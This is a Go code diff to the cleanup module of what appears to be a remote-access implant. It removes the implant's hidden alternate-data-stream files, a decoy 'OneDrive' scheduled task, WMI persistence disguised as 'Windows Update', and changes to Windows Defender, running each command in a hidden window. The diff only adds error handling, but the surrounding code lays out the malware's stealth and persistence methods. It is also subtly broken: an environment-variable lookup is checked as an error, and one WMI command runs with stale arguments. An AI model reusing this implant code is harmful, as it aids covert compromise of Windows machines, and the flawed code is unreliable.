@@ -26,7 +26,10 @@ func (c CleanUp) Run(clientID string, jobID string, args []string) (string, erro
 		return "", errors.New("cleanup takes 1 argument")
 	}
 	mode := args[0]
-	appdata, _ := os.LookupEnv("APPDATA")
+	appdata, err := os.LookupEnv("APPDATA")
+	if err != nil {
+		return "", err
+	}
 	path := appdata + "\\Windows:svchost.exe"
 	os.Remove(path)
 	path = appdata + "\\Windows:winrm.vbs"
@@ -58,7 +61,10 @@ func (c CleanUp) Run(clientID string, jobID string, args []string) (string, erro
 			}
 			Exec2 := exec.Command("cmd", "/c", string(DecodedHKLM))
 			Exec2.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-			Exec2.Run()
+			err = Exec2.Run()
+			if err != nil {
+				return "", err
+			}
 		}
 	case "scheduler":
 		var task string = "c2NodGFza3MgL2RlbGV0ZSAvVE4gIk9uZURyaXZlIFN0YW5kYWxvbmUgVXBkYXRlIFRhc2siIC9m"
@@ -72,8 +78,14 @@ func (c CleanUp) Run(clientID string, jobID string, args []string) (string, erro
 		TASK.Close()
 		Exec := exec.Command("cmd", "/C", "C:\\Users\\Public\\build.bat")
 		Exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-		Exec.Run()
-		deleteFile("C:\\Users\\Public\\build.bat")
+		err = Exec.Run()
+		if err != nil {
+			return "", err
+		}
+		err = os.Remove("C:\\Users\\Public\\build.bat")
+		if err != nil {
+			return "", err
+		}
 	case "exclusion":
 		if checkForAdmin() {
 			cmdName := "powershell.exe"
@@ -81,7 +93,10 @@ func (c CleanUp) Run(clientID string, jobID string, args []string) (string, erro
 			cmdEArgs := []string{"Remove-MpPreference -ExclusionPath C:\\"}
 			cmdE = exec.Command(cmdName, cmdEArgs...)
 			cmdE.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-			cmdE.Run()
+			err = cmdE.Run()
+			if err != nil {
+				return "", err
+			}
 		}
 	case "realtime":
 		cmdName := "powershell.exe"
@@ -89,7 +104,10 @@ func (c CleanUp) Run(clientID string, jobID string, args []string) (string, erro
 		cmdArgs := []string{"Set-MpPreference -DisableRealtimeMonitoring $false"}
 		cmdRT = exec.Command(cmdName, cmdArgs...)
 		cmdRT.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-		cmdRT.Run()
+		err = cmdRT.Run()
+		if err != nil {
+			return "", err
+		}
 	case "wmi":
 		if checkForAdmin() {
 			cmdName := "powershell.exe"
@@ -97,13 +115,22 @@ func (c CleanUp) Run(clientID string, jobID string, args []string) (string, erro
 			cmdArgs := []string{"Get-WMIObject -Namespace root/Subscription -Class __EventFilter -Filter \"Name='Windows Update Event'\" | Remove-WmiObject"}
 			cmd = exec.Command(cmdName, cmdArgs...)
 			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-			cmd.Run()
+			err = cmd.Run()
+			if err != nil {
+				return "", err
+			}
 			cmdArgs = []string{"Get-WMIObject -Namespace root/Subscription -Class CommandLineEventConsumer -Filter \"Name='Windows Update Consumer'\" | Remove-WmiObject"}
 			cmd = exec.Command(cmdName, cmdArgs...)
-			cmd.Run()
+			err = cmd.Run()
+			if err != nil {
+				return "", err
+			}
 			cmd = exec.Command(cmdName, cmdArgs...)
 			cmdArgs = []string{"Get-WMIObject -Namespace root/Subscription -Class __FilterToConsumerBinding -Filter \"__Path LIKE '%Windows Update%'\" | Remove-WmiObject"}
-			cmd.Run()
+			err = cmd.Run()
+			if err != nil {
+				return "", err
+			}
 		}
 	case "signatures":
 		cmdName := "cmd.exe"
@@ -111,7 +138,10 @@ func (c CleanUp) Run(clientID string, jobID string, args []string) (string, erro
 		cmdArgs := []string{"\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\"  -SignatureUpdate Set-MpPreference -DisableIOAVProtection $false"}
 		cmdS = exec.Command(cmdName, cmdArgs...)
 		cmdS.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-		cmdS.Run()
+		err = cmdS.Run()
+		if err != nil {
+			return "", err
+		}
 	}
 
 	return "Cleanup completed.", nil
